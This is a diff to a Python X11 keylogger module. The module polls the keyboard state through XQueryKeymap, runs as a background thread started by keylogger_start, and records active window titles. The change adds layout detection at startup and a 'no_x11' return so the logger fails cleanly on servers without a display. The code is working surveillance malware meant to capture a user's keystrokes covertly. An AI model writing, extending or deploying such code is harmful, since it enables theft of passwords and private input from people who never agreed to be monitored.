@@ -15,7 +15,7 @@ display = x11.XOpenDisplay(None)
 
 # this will hold the keyboard state.  32 bytes, with each bit representing the state for a single key.
 keyboard = (ct.c_char * 32)()
-keyboard_layout = 'qwerty' # default layout
+keyboard_layout = False
 
 # these are the locations (byte, byte value) of special keys to watch
 shift_keys = ((6,4), (7,64))
@@ -196,9 +196,15 @@ key_mapping_azerty = {
 }
 
 def keylogger_start():
+    global keyboard_layout
     if hasattr(sys, 'KEYLOGGER_THREAD'):
         return False
+
     keyLogger = KeyLogger()
+    keyboard_layout = keyLogger.getKeyboardLayout()
+    if not keyboard_layout:
+        return "no_x11"
+
     keyLogger.start()
     sys.KEYLOGGER_THREAD=keyLogger
     return True
@@ -213,7 +219,6 @@ def keylogger_stop():
         del sys.KEYLOGGER_THREAD
         return True
     return False
-
 
 def get_active_window_title():
     root_check = ''
@@ -266,7 +271,7 @@ class KeyLogger(threading.Thread):
 
     def run(self):
         global key_mapping, keyboard_layout
-        keyboard_layout = self.getKeyboardLayout()
+        # keyboard_layout = self.getKeyboardLayout()
         if keyboard_layout == 'azerty':
             key_mapping = key_mapping_azerty
         else:
@@ -287,8 +292,10 @@ class KeyLogger(threading.Thread):
         for line in process.stdout.readlines():
             if 'azerty' in line:
                 return 'azerty'
-        # default is qwerty (if setxkbmap fails)
-        return 'qwerty'
+            elif 'qwerty' in line:
+                return 'qwerty'
+        # adding a default  value will crash the process on server without x11 graphical interface
+        return False
 
     def fetch_keys_raw(self):
         x11.XQueryKeymap(display, keyboard)
